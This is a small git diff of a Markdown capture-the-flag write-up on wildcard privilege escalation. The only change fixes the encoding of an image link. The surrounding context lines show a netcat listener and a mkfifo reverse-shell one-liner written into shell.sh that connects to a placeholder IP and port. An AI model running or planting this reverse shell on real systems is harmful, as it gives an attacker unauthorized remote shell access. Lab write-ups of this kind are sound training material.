@@ -171,7 +171,7 @@ To escalate privileges to michael we can use the [wildcards](https://book.hacktr
 nc -lvp PORT
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/abrimos+puerto.png)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/abrimos%20puerto.png)
 
 ```shell
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f" > shell.sh
